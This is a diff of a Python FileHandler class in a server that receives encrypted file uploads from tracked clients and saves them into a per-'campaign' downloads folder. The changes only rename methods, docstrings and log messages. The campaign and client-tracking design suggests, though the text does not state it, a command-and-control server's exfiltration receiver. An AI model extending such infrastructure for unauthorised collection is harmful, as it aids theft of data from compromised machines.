@@ -8,10 +8,10 @@ from handlers.base_handler import BaseHandler
 logger = logging.getLogger(__name__)
 
 class FileHandler(BaseHandler):
-    """Handler for file upload requests"""
+    """Handler for file uploads from clients to server"""
     
     def handle(self):
-        """Process file upload from client"""
+        """Process file upload from client to server (client uploads, server receives)"""
         # Get content data
         content_length = int(self.headers.get('Content-Length', 0))
         if content_length == 0:
@@ -50,12 +50,12 @@ class FileHandler(BaseHandler):
                 return
             
             # Save the file
-            file_path = self._save_uploaded_file(client_id, decrypted_data)
+            file_path = self._save_file_from_client(client_id, decrypted_data)
             
             # Prepare success response with proper structure
             success_response = {
                 "Status": "Success",
-                "Message": f"File uploaded successfully to {file_path}",
+                "Message": f"File received successfully and saved to {file_path}",
                 "FilePath": file_path
             }
             
@@ -86,12 +86,12 @@ class FileHandler(BaseHandler):
                     client_id = self._identify_client_by_ip()  # Still need a client ID for saving
                 
                 # Save the file
-                file_path = self._save_uploaded_file(client_id or self.client_address[0], decrypted_data)
+                file_path = self._save_file_from_client(client_id or self.client_address[0], decrypted_data)
                 
                 # Prepare and encrypt success response
                 success_response = {
                     "Status": "Success",
-                    "Message": f"File uploaded successfully to {file_path}",
+                    "Message": f"File received successfully and saved to {file_path}",
                     "FilePath": file_path
                 }
                 
@@ -155,8 +155,8 @@ class FileHandler(BaseHandler):
                 return client_id
         return None
             
-    def _save_uploaded_file(self, client_id, file_content):
-        """Save uploaded file content to disk with improved error handling"""
+    def _save_file_from_client(self, client_id, file_content):
+        """Save file content received from client to server's downloads folder"""
         # Prepare the downloads directory for files coming FROM client TO server
         campaign_folder = self.get_campaign_folder()
         
@@ -176,7 +176,7 @@ class FileHandler(BaseHandler):
                 except json.JSONDecodeError as e:
                     self.log_message(f"Error parsing JSON: {e}, content: {file_content[:100]}...")
                     # Not valid JSON, save as raw text
-                    return self._save_raw_file(downloads_folder, file_content, client_id)
+                    return self._save_raw_file_from_client(downloads_folder, file_content, client_id)
             else:
                 # Already parsed JSON
                 file_info = file_content
@@ -184,16 +184,16 @@ class FileHandler(BaseHandler):
             # Check if it's a structured file upload
             if isinstance(file_info, dict) and 'FileName' in file_info and 'FileContent' in file_info:
                 # This is a structured file upload with filename and base64 content
-                file_path = self._save_structured_file(downloads_folder, file_info, client_id)
+                file_path = self._save_structured_file_from_client(downloads_folder, file_info, client_id)
                 return file_path
             else:
                 # Not a structured file upload, save as raw text
-                return self._save_raw_file(downloads_folder, str(file_content), client_id)
+                return self._save_raw_file_from_client(downloads_folder, str(file_content), client_id)
         except Exception as e:
-            self.log_message(f"Error in _save_uploaded_file: {e}")
+            self.log_message(f"Error in _save_file_from_client: {e}")
             # Fallback to saving as raw text
             try:
-                return self._save_raw_file(downloads_folder, str(file_content), client_id)
+                return self._save_raw_file_from_client(downloads_folder, str(file_content), client_id)
             except Exception as e2:
                 self.log_message(f"Error saving raw file: {e2}")
                 # Create an error file
@@ -202,8 +202,8 @@ class FileHandler(BaseHandler):
                     f.write(f"Error saving file: {e}\nSecondary error: {e2}\n")
                 return error_path
                 
-    def _save_structured_file(self, downloads_folder, file_info, client_id=None):
-        """Save a structured file upload with filename and content"""
+    def _save_structured_file_from_client(self, downloads_folder, file_info, client_id=None):
+        """Save a structured file received from a client"""
         file_name = file_info['FileName']
         file_content_base64 = file_info['FileContent']
         
@@ -219,20 +219,20 @@ class FileHandler(BaseHandler):
             with open(file_path, 'wb') as f:
                 f.write(file_content_bytes)
             
-            # Log the upload (from client perspective) / download (from server perspective)
+            # Log the file receipt
             self.log_message(f"File received from {client_id or self.client_address[0]}: {file_name} ({len(file_content_bytes)} bytes)")
             if client_id:
-                self.client_manager.log_event(client_id, "File Upload", f"File received and saved to {file_path}")
+                self.client_manager.log_event(client_id, "File Received", f"File from client saved to {file_path}")
                 
             return file_path
         except Exception as e:
-            logger.error(f"Error saving structured file: {e}")
+            logger.error(f"Error saving file from client: {e}")
             raise
             
-    def _save_raw_file(self, downloads_folder, content, client_id=None):
-        """Save raw text content as a file"""
+    def _save_raw_file_from_client(self, downloads_folder, content, client_id=None):
+        """Save raw text content received from a client"""
         timestamp = time.strftime("%Y%m%d-%H%M%S")
-        file_path = os.path.join(downloads_folder, f"download_{timestamp}.txt")
+        file_path = os.path.join(downloads_folder, f"received_{timestamp}.txt")
         
         try:
             # Try writing with utf-8 first
@@ -245,6 +245,6 @@ class FileHandler(BaseHandler):
             
         self.log_message(f"Raw text received from {client_id or self.client_address[0]} and saved to {file_path}")
         if client_id:
-            self.client_manager.log_event(client_id, "File Upload", f"Raw text saved to {file_path}")
+            self.client_manager.log_event(client_id, "File Received", f"Raw text from client saved to {file_path}")
             
         return file_path
